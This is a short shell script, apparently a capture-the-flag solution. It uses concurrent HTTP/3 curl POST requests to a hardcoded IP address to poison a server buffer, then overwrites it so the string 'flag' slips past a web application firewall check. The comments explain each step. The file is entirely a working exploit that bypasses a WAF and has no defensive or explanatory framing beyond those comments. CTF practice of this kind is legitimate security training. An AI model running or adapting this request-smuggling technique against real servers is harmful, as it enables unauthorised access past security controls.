#! /bin/sh

# first, fill the buffer with chunk + flag => this will write the payload in the buffer then return a WAF error
for i in {1..10}; do
  curl -vk --http3 -X POST https://35.220.136.70:32069/ \
    -H "Content-Length: 20" \
    --data "AAAAAAAflag         " &
done
wait

# second, send "I want " to bypass the check + over write the A's => "flag" remains in the buffer + additional spaces gets trimmed
for i in {1..5}; do
  curl -vk --http3 -X POST https://35.220.136.70:32069/ \
    -H "Content-Length: 20" \
    --data "I want " \
    --output flag.txt && cat flag.txt
done